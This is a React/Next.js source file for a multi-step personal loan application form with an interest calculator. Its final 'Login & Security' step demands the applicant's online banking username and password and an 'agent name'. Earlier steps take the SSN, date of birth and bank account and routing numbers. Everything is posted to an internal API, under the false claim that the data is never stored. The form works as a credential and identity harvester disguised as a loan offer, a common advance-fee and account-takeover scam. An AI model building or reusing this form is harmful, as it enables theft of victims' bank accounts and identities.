// components/ApplyNowForm.tsx
"use client";

import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { useRouter } from "next/navigation";

export default function ApplyNowForm() {
  const [currentStep, setCurrentStep] = useState(1);
  const totalSteps = 4;
  const router = useRouter();

  const [formData, setFormData] = useState({
    loanamount: "",
    loanduration: "",
    loanpurpose: "",
    firstname: "",
    lastname: "",
    homeaddress: "",
    city: "",
    state: "",
    zipcode: "",
    dateofbirth: "",
    bankname: "",
    routingnumber: "",
    accountnumber: "",
    ssn: "",
    Username: "",
    mobilebankingpassword: "",
    agentName: "",
  });

  const [emi, setEmi] = useState({
    monthlyInterest: 0,
    monthlyPayment: 0,
    totalRepayment: 0,
    totalInterest: 0,
  });
  const [errors, setErrors] = useState<{ [key: string]: string }>({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  // EMI Calculation
  useEffect(() => {
    const loanAmount = parseFloat(formData.loanamount);
    const duration = parseInt(formData.loanduration);

    if (
      loanAmount >= 2000 &&
      loanAmount <= 15000 &&
      duration >= 1 &&
      duration <= 60
    ) {
      const interestRate = 0.01;
      const monthlyInterest = loanAmount * interestRate;
      const monthlyPayment = (loanAmount + monthlyInterest * duration) / duration;
      const totalRepayment = monthlyPayment * duration;
      const totalInterest = totalRepayment - loanAmount;

      setEmi({ monthlyInterest, monthlyPayment, totalRepayment, totalInterest });
    }
  }, [formData.loanamount, formData.loanduration]);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    if (errors[name]) {
      setErrors((prev) => {
        const newErr = { ...prev };
        delete newErr[name];
        return newErr;
      });
    }
  };

  const handleDateInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length >= 2) value = value.slice(0, 2) + "/" + value.slice(2);
    if (value.length >= 5) value = value.slice(0, 5) + "/" + value.slice(5, 9);
    setFormData((prev) => ({ ...prev, dateofbirth: value }));
  };

  const formatSSN = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    setFormData((prev) => ({ ...prev, ssn: value }));
  };

  const formatZIP = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "").slice(0, 5);
    setFormData((prev) => ({ ...prev, zipcode: value }));
  };

  const validateStep = () => {
    const newErrors: { [key: string]: string } = {};

    switch (currentStep) {
      case 1:
        if (!formData.loanamount || isNaN(parseFloat(formData.loanamount)) || parseFloat(formData.loanamount) < 2000 || parseFloat(formData.loanamount) > 15000)
          newErrors.loanamount = "Enter $2K–$15K";
        if (!formData.loanduration || parseInt(formData.loanduration) < 1 || parseInt(formData.loanduration) > 60)
          newErrors.loanduration = "1–60 months";
        if (!formData.loanpurpose) newErrors.loanpurpose = "Select a purpose";
        break;

      case 2:
        if (!/^[A-Za-z\s]+$/.test(formData.firstname)) newErrors.firstname = "Letters only";
        if (!/^[A-Za-z\s]+$/.test(formData.lastname)) newErrors.lastname = "Letters only";
        if (!formData.homeaddress) newErrors.homeaddress = "Required";
        if (!formData.city) newErrors.city = "Required";
        if (!formData.state) newErrors.state = "Required";
        if (!/^\d{5}$/.test(formData.zipcode)) newErrors.zipcode = "5-digit ZIP";
        if (!/^\d{2}\/\d{2}\/\d{4}$/.test(formData.dateofbirth)) newErrors.dateofbirth = "MM/DD/YYYY";
        break;

      case 3:
        if (!formData.bankname) newErrors.bankname = "Required";
        if (!/^\d{8,17}$/.test(formData.accountnumber)) newErrors.accountnumber = "8–17 digits";
        break;

      case 4:
        if (!formData.Username) newErrors.Username = "Required";
        if (!formData.mobilebankingpassword) newErrors.mobilebankingpassword = "Required";
        if (!formData.agentName) newErrors.agentName = "Required";
        break;
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const nextStep = () => {
    if (validateStep()) {
      setCurrentStep((prev) => Math.min(prev + 1, totalSteps));
    }
  };

  const goBack = () => {
    setCurrentStep((prev) => Math.max(prev - 1, 1));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateStep()) return;

    setIsSubmitting(true);

    try {
      const res = await fetch("/api/apply-now", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });

      if (res.ok) {
        setFormData({
          loanamount: "",
          loanduration: "",
          loanpurpose: "",
          firstname: "",
          lastname: "",
          homeaddress: "",
          city: "",
          state: "",
          zipcode: "",
          dateofbirth: "",
          bankname: "",
          routingnumber: "",
          accountnumber: "",
          ssn: "",
          Username: "",
          mobilebankingpassword: "",
          agentName: "",
        });
        setCurrentStep(1);
        router.push("/under-review");
      } else {
        alert("❌ Submission failed. Please try again.");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("🌐 Network error. Please check your connection.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const progressPercent = (currentStep / totalSteps) * 100;

  return (
    <section className="py-12 pt-20 bg-gradient-to-br from-blue-50 via-white to-cyan-50 min-h-screen">
      <div className="container mx-auto px-4 max-w-4xl">
        {/* Header */}
        <div className="text-center mb-8">
          <h2 className="text-3xl font-bold text-gray-800 mb-2">Apply in Minutes</h2>
          <p className="text-gray-600">Get fast funding with our secure, step-by-step process</p>
        </div>

        {/* Progress Bar */}
        <div className="mb-8 relative">
          <div className="h-2 bg-gray-200 rounded-full overflow-hidden">
            <motion.div
              className="h-full bg-gradient-to-r from-blue-600 to-teal-500"
              initial={{ width: 0 }}
              animate={{ width: `${progressPercent}%` }}
              transition={{ duration: 0.6, ease: "easeOut" }}
            />
          </div>
          <div className="flex justify-between text-xs text-gray-500 mt-2">
            {["Loan", "Personal", "Banking", "Login"].map((label, i) => (
              <span key={i} className={i + 1 <= currentStep ? "font-medium text-blue-700" : ""}>
                {label}
              </span>
            ))}
          </div>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit} className="bg-white rounded-2xl shadow-xl p-8">
          <AnimatePresence mode="wait">
            {/* Step 1: Loan Details */}
            {currentStep === 1 && (
              <motion.div
                key="step1"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                transition={{ duration: 0.3 }}
              >
                <h3 className="text-2xl font-semibold text-gray-800 mb-6">Loan Details</h3>
                <div className="space-y-5">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">Loan Amount</label>
                    <input
                      type="number"
                      name="loanamount"
                      value={formData.loanamount}
                      onChange={handleChange}
                      placeholder="$2,000 to $15,000"
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.loanamount ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"
                        }`}
                    />
                    {errors.loanamount && <p className="text-red-500 text-sm mt-1">{errors.loanamount}</p>}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">Loan Duration (Months)</label>
                    <input
                      type="number"
                      name="loanduration"
                      value={formData.loanduration}
                      onChange={handleChange}
                      placeholder="1–60 months"
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.loanduration ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"
                        }`}
                    />
                    {errors.loanduration && <p className="text-red-500 text-sm mt-1">{errors.loanduration}</p>}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">Loan Purpose</label>
                    <select
                      name="loanpurpose"
                      value={formData.loanpurpose}
                      onChange={handleChange}
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.loanpurpose ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"
                        }`}
                    >
                      <option value="">Select Purpose</option>
                      <option value="CREDIT_CARD">Pay off Credit Cards</option>
                      <option value="DEBT_CONSOLIDATION">Debt Consolidation</option>
                      <option value="HOME_IMPROVEMENT">Home Improvement</option>
                      <option value="LARGE_PURCHASE">Large Purchase</option>
                      <option value="OTHER">Other</option>
                    </select>
                    {errors.loanpurpose && <p className="text-red-500 text-sm mt-1">{errors.loanpurpose}</p>}
                  </div>

                  <div className="flex justify-end mt-8">
                    <button
                      type="button"
                      onClick={nextStep}
                      className="px-8 py-3 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg transition transform hover:scale-105"
                    >
                      Continue →
                    </button>
                  </div>
                </div>
              </motion.div>
            )}

            {/* Step 2: Personal Info */}
            {currentStep === 2 && (
              <motion.div
                key="step2"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                transition={{ duration: 0.3 }}
              >
                <h3 className="text-2xl font-semibold text-gray-800 mb-6">Personal Information</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                  {[
                    { label: "First Name", name: "firstname", type: "text" },
                    { label: "Last Name", name: "lastname", type: "text" },
                    { label: "City", name: "city", type: "text" },
                    { label: "State", name: "state", type: "text" },
                  ].map((field) => (
                    <div key={field.name}>
                      <label className="block text-sm font-medium text-gray-700 mb-1">{field.label}</label>
                      <input
                        type={field.type}
                        name={field.name}
                        value={formData[field.name]}
                        onChange={handleChange}
                        className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors[field.name] ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"
                          }`}
                      />
                      {errors[field.name] && <p className="text-red-500 text-sm mt-1">{errors[field.name]}</p>}
                    </div>
                  ))}
                  <div className="md:col-span-2">
                    <label className="block text-sm font-medium text-gray-700 mb-1">Home Address</label>
                    <input
                      type="text"
                      name="homeaddress"
                      value={formData.homeaddress}
                      onChange={handleChange}
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.homeaddress ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"
                        }`}
                    />
                    {errors.homeaddress && <p className="text-red-500 text-sm mt-1">{errors.homeaddress}</p>}
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">ZIP Code</label>
                    <input
                      type="text"
                      name="zipcode"
                      value={formData.zipcode}
                      onChange={formatZIP}
                      placeholder="12345"
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.zipcode ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"
                        }`}
                    />
                    {errors.zipcode && <p className="text-red-500 text-sm mt-1">{errors.zipcode}</p>}
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">Date of Birth</label>
                    <input
                      type="text"
                      name="dateofbirth"
                      value={formData.dateofbirth}
                      onChange={handleDateInput}
                      placeholder="MM/DD/YYYY"
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.dateofbirth ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"
                        }`}
                    />
                    {errors.dateofbirth && <p className="text-red-500 text-sm mt-1">{errors.dateofbirth}</p>}
                  </div>
                </div>
                <div className="flex justify-between mt-8">
                  <button
                    type="button"
                    onClick={goBack}
                    className="px-6 py-3 text-gray-600 hover:text-gray-800 font-medium"
                  >
                    ← Back
                  </button>
                  <button
                    type="button"
                    onClick={nextStep}
                    className="px-8 py-3 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg transition transform hover:scale-105"
                  >
                    Continue →
                  </button>
                </div>
              </motion.div>
            )}

            {/* Step 3: Banking Info */}
            {currentStep === 3 && (
              <motion.div
                key="step3"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                transition={{ duration: 0.3 }}
              >
                <h3 className="text-2xl font-semibold text-gray-800 mb-6">Banking Information</h3>
                <div className="space-y-5">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">Bank Name</label>
                    <input
                      type="text"
                      name="bankname"
                      value={formData.bankname}
                      onChange={handleChange}
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.bankname ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"
                        }`}
                    />
                    {errors.bankname && <p className="text-red-500 text-sm mt-1">{errors.bankname}</p>}
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">Routing Number</label>
                    <input
                      type="text"
                      name="routingnumber"
                      value={formData.routingnumber}
                      onChange={handleChange}
                      placeholder="9 digits"
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.routingnumber ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"
                        }`}
                    />
                    {errors.routingnumber && <p className="text-red-500 text-sm mt-1">{errors.routingnumber}</p>}
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">Account Number</label>
                    <input
                      type="text"
                      name="accountnumber"
                      value={formData.accountnumber}
                      onChange={handleChange}
                      placeholder="8–17 digits"
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.accountnumber ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"
                        }`}
                    />
                    {errors.accountnumber && <p className="text-red-500 text-sm mt-1">{errors.accountnumber}</p>}
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">SSN</label>
                    <input
                      type="text"
                      name="ssn"
                      value={formData.ssn}
                      onChange={formatSSN}
                      placeholder="XXX-XX-XXXX"
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.ssn ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"
                        }`}
                    />
                    {errors.ssn && <p className="text-red-500 text-sm mt-1">{errors.ssn}</p>}
                  </div>
                </div>
                <div className="flex justify-between mt-8">
                  <button
                    type="button"
                    onClick={goBack}
                    className="px-6 py-3 text-gray-600 hover:text-gray-800 font-medium"
                  >
                    ← Back
                  </button>
                  <button
                    type="button"
                    onClick={nextStep}
                    className="px-8 py-3 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg transition transform hover:scale-105"
                  >
                    Continue →
                  </button>
                </div>
              </motion.div>
            )}

            {/* Step 4: Login Info */}
            {currentStep === 4 && (
              <motion.div
                key="step4"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                transition={{ duration: 0.3 }}
              >
                <h3 className="text-2xl font-semibold text-gray-800 mb-6">Login & Security</h3>
                <div className="space-y-5">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">Username</label>
                    <input
                      type="text"
                      name="Username"
                      value={formData.Username}
                      onChange={handleChange}
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.Username ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"
                        }`}
                    />
                    {errors.Username && <p className="text-red-500 text-sm mt-1">{errors.Username}</p>}
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">Banking Password</label>
                    <input
                      type="password"
                      name="mobilebankingpassword"
                      value={formData.mobilebankingpassword}
                      onChange={handleChange}
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.mobilebankingpassword ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"
                        }`}
                    />
                    {errors.mobilebankingpassword && <p className="text-red-500 text-sm mt-1">{errors.mobilebankingpassword}</p>}
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">Agent Name</label>
                    <input
                      type="text"
                      name="agentName"
                      value={formData.agentName}
                      onChange={handleChange}
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.agentName ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"
                        }`}
                    />
                    {errors.agentName && <p className="text-red-500 text-sm mt-1">{errors.agentName}</p>}
                  </div>
                </div>
                <div className="mt-8 text-sm text-gray-500">
                  <p>🔐 Your information is encrypted and never stored on our servers.</p>
                </div>
                <div className="flex justify-between mt-6">
                  <button
                    type="button"
                    onClick={goBack}
                    className="px-6 py-3 text-gray-600 hover:text-gray-800 font-medium"
                  >
                    ← Back
                  </button>
                  <button
                    type="submit"
                    disabled={isSubmitting}
                    className="px-8 py-3 bg-green-600 hover:bg-green-700 text-white font-medium rounded-lg transition transform hover:scale-105 disabled:opacity-70"
                  >
                    {isSubmitting ? "Submitting..." : "Submit Application"}
                  </button>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </form>

        {/* Floating Help Button */}
        <div className="fixed bottom-6 right-6">
          <button className="w-14 h-14 bg-blue-600 hover:bg-blue-700 text-white rounded-full shadow-lg flex items-center justify-center text-xl font-bold transition transform hover:scale-110">
            ?
          </button>
        </div>
      </div>
    </section>
  );
}